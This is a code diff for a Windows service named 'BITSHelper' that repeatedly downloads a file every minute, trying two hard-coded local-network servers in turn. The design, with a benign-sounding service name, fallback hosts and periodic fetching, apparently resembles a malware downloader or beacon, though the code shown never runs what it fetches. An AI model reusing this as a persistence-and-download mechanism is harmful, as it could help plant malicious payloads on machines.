@@ -1,12 +1,19 @@
 #include "bits_operations.h"
 #include "file_operations.h"
 #include <windows.h>
+#include <vector>
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatusHandle;
 
 std::wstring remoteUrl;
 std::wstring localDir;
+std::wstring fullUrl;
+
+std::vector<std::wstring> remoteUrls = {
+    L"http://192.168.145.132:8080/clients",
+    L"http://192.168.145.140:8080/clients",
+};
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
 {
@@ -20,8 +27,7 @@ void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
     }
 }
 
-void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
-{
+void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
     hStatusHandle = RegisterServiceCtrlHandler(L"BITSHelper", ServiceCtrlHandler);
     if (hStatusHandle == NULL) {
         return;
@@ -73,9 +79,15 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
 
     // Start your executable logic here
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
-        CoInitialize(nullptr);
-        DownloadFile(remoteUrl, localFile);  // Download the file with the generated filename
-        CoUninitialize();
+        for (const auto& url : remoteUrls) {
+            fullUrl = url + remoteUrl;
+
+            CoInitialize(nullptr);
+            if (DownloadFile(fullUrl, localFile)) { // Download the file with the generated filename
+                CoUninitialize();
+                break;
+            }
+        }
         Sleep(60000);  // Wait for 60 seconds before downloading again
     }
 }
